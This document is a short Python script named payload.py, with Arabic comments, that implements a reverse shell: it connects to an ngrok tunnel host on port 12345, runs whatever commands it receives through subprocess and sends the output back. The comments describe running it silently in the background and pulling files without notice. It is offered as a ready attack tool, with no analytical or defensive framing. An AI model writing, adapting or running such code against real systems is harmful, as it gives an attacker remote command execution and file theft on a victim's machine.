# [FILE: payload.py] - النسخة المشفرة بالكامل
import os, socket, subprocess, threading

def _exec_():
    # إعدادات الاتصال العكسي (Reverse Shell) لجهازك
    _h = "0.tcp.ngrok.io" 
    _p = 12345 
    
    try:
        _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _s.connect((_h, _p))
        while True:
            _d = _s.recv(1024).decode("utf-8")
            if _d.lower() == "exit": break
            # تنفيذ الأوامر وسحب الملفات صمتاً
            _o = subprocess.getoutput(_d)
            _s.send(_o.encode("utf-8"))
    except: pass

if __name__ == "__main__":
    # التشغيل في الخلفية كعملية نظام (Background Process)
    threading.Thread(target=_exec_, daemon=True).start()
